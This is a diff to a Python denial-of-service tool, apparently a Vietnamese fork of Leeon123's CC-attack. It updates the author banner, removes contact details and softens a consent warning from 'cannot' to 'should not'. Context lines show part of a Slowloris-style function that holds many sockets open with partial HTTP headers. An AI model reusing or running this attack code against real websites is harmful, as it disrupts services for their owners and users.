@@ -23,15 +23,13 @@ print ('''
 ├────────────────────────────────────────────────────────────────────────┤
 │ © Copyright 2021 - Đậu Đậu - Version 3.6 (14/12/2021)                  │
 ├────────────────────────────────────────────────────────────────────────┤
-│ YTB: https://www.youtube.com/channel/UCly-jPYF0jWZS12IdyVZqsg/featured │
+│ YTB: https://www.youtube.com/@daudau5.0/                               │
 │ FB: https://www.facebook.com/daudau.432/                               │
 │ Github: https://github.com/DauDau432/                                  │
-│ Gmail: aulax432@gmail.com                                              │
-│ Zalo: 0983538806                                                       │
 ├────────────────────────────────────────────────────────────────────────┤
-│ Bạn không thể tấn công trang web của người khác nếu không có sự đồng ý!│
+│ Bạn không nên tấn công trang web của người khác nếu không có sự đồng ý │
 ├────────────────────────────────────────────────────────────────────────┤
-│ Dựa trên CC-attack của Leeon123                                        │
+│ Phiên bản dựa trên CC-attack của Leeon123                                        │
 └────────────────────────────────────────────────────────────────────────┘''')
 
 acceptall = [
@@ -431,7 +429,7 @@ def slow(conn,socks_type):
 			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
 			if cookies != "":
 				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
-			s.send(("Connection:keep-alive").encode("utf-8"))
+			s.send(("Connection:keep-alive").encode("utf-8"))#copyright by daudau 
 			
 			socket_list.append(s)
 			sys.stdout.write("[*] Đang tấn công Slow || Số kết nối: "+str(len(socket_list))+"\r")
